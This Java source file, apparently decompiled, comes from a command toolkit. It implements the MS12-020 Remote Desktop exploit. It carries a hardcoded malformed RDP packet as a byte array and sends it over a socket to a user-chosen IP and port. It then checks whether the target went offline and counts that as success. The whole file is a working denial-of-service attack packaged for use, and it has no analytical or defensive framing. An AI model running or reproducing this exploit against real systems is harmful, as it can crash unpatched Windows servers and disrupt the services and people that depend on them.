package me.uncodable.srt.impl.commands.metasploit.impl;

import java.io.IOException;
import java.io.OutputStream;
import java.net.Socket;
import me.uncodable.srt.impl.commands.metasploit.api.MetasploitCommand;
import me.uncodable.srt.impl.commands.metasploit.api.MetasploitCommandInfo;

@MetasploitCommandInfo(
   name = "MS12-020",
   desc = "This exploit targets Remote Deskop servers by exploiting the MS12-020 vulnerability up to Windows 7."
)
public class MS12_020 extends MetasploitCommand {
   private static final byte[] MALFORMED_PACKET = new byte[]{
      3,
      0,
      0,
      19,
      14,
      -32,
      0,
      0,
      0,
      0,
      0,
      1,
      0,
      8,
      0,
      0,
      0,
      0,
      0,
      3,
      0,
      0,
      106,
      2,
      -16,
      -128,
      127,
      101,
      -126,
      0,
      94,
      4,
      1,
      1,
      4,
      1,
      1,
      1,
      1,
      -1,
      48,
      25,
      2,
      1,
      -1,
      2,
      1,
      -1,
      2,
      1,
      0,
      2,
      1,
      1,
      2,
      1,
      0,
      2,
      1,
      1,
      2,
      2,
      0,
      124,
      2,
      1,
      2,
      48,
      25,
      2,
      1,
      -1,
      2,
      1,
      -1,
      2,
      1,
      0,
      2,
      1,
      1,
      2,
      1,
      0,
      2,
      1,
      1,
      2,
      2,
      0,
      124,
      2,
      1,
      2,
      48,
      25,
      2,
      1,
      -1,
      2,
      1,
      -1,
      2,
      1,
      0,
      2,
      1,
      1,
      2,
      1,
      0,
      2,
      1,
      1,
      2,
      2,
      0,
      124,
      2,
      1,
      2,
      4,
      -126,
      0,
      0,
      3,
      0,
      0,
      8,
      2,
      -16,
      -128,
      40,
      3,
      0,
      0,
      8,
      2,
      -16,
      -128,
      40,
      3,
      0,
      0,
      8,
      2,
      -16,
      -128,
      40,
      3,
      0,
      0,
      8,
      2,
      -16,
      -128,
      40,
      3,
      0,
      0,
      8,
      2,
      -16,
      -128,
      40,
      3,
      0,
      0,
      8,
      2,
      -16,
      -128,
      40,
      3,
      0,
      0,
      8,
      2,
      -16,
      -128,
      40,
      3,
      0,
      0,
      8,
      2,
      -16,
      -128,
      40,
      3,
      0,
      0,
      12,
      2,
      -16,
      -128,
      56,
      0,
      6,
      3,
      -16,
      3,
      0,
      0,
      9,
      2,
      -16,
      -128,
      33,
      -128
   };

   @Override
   public void exec(String[] args) {
      int port = 3389;
      String ip;
      switch(args.length) {
         case 1:
            this.bad("Invalid host IP address supplied.\n Usage: ->MS12-020 <Target IP Address> [Target Port]");
            return;
         case 2:
            ip = args[1];
            break;
         default:
            if (args.length <= 3) {
               this.bad("Usage: ->MS12-020 <Target IP Address> [Target Port]");
               return;
            }

            ip = args[1];

            try {
               port = Integer.parseInt(args[2]);
            } catch (NumberFormatException var8) {
               this.bad("Invalid host port supplied.");
               this.info("Continuing with port 3389...");
            }
      }

      int finalPort = port;
      Runnable runnable = () -> {
         this.info("Connecting to the target device...");

         Socket s;
         try {
            s = new Socket(ip, finalPort);
         } catch (IOException var11) {
            this.bad(String.format("Failed to initialize the network socket. Error: %s", var11.getMessage()));
            return;
         }

         this.good("Connected to the target device.");
         this.info("Retrieving the network socket's output stream...");

         OutputStream out;
         try {
            out = s.getOutputStream();
         } catch (IOException var10) {
            this.bad(String.format("Failed to retrieve output stream for the network socket. Error: %s", var10.getMessage()));
            return;
         }

         this.good("Retrieved the network socket's output stream.");
         this.info("Sending a malformed Remote Desktop Protocol request...");

         try {
            out.write(MALFORMED_PACKET);
            out.flush();
            Thread.sleep(500L);
            out.close();
            s.close();
         } catch (IOException var8x) {
            this.bad(String.format("Failed to send the malformed Remote Desktop Protocol packet to the target device. Error: %s", var8x.getMessage()));
            return;
         } catch (InterruptedException var9) {
            this.bad(String.format("An error occurred with the exploit thread. Error: %s", var9.getMessage()));
            return;
         }

         this.good("Sent the malformed Remote Desktop Protocol packet to the target device.");
         this.info("Checking if the target machine is online...");

         try {
            Thread.sleep(5000L);
         } catch (InterruptedException var7x) {
            this.bad("Failed to sleep thread.");
         }

         try {
            new Socket(ip, finalPort);
         } catch (IOException var6x) {
            this.good("The target host appears to be offline. Exploit completed successfully.");
            return;
         }

         this.bad("The target host appears to be online. Exploit failed.");
      };
      Thread thread = new Thread(runnable);
      thread.start();
   }
}
